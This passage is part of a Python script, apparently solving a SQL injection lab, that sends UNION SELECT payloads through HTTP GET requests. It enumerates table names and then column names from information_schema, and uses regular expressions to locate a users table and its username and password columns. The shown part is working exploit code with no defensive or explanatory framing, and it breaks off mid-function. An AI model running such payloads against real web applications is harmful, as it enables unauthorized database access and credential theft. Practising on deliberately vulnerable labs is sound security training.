...
def get_user_table():
    '''
    re match for 'users_' table and return the tablename
    '''
    payload1 = "'+UNION+SELECT+NULL,+table_name+FROM+information_schema.tables--"
    r1 = s.get(url+payload1)
    #print(r1.text)
    soup1 = BeautifulSoup(r1.text, 'html.parser')
    # user_table = soup1.body.findAll(text=re.compile('users_'))[0]
    user_table = soup1.body.findAll(text=re.compile('^users_',re.IGNORECASE))[0]
    return str(user_table)

def get_column_names(tablename):
    '''
    re match for 'username_' and 'password_' columns and return column names
    '''
    payload2 = f"'+UNION+SELECT+NULL,+column_name+FROM+information_schema.columns+where+table_name='{tablename}'--"
    r2 = s.get(url+payload2)
    soup2 = BeautifulSoup(r2.text, 'html.parser')
    # user_column = soup2.body.findAll(text=re.compile('username_'))[0]
    # pass_column = soup2.body.findAll(text=re.compile('password_'))[0]
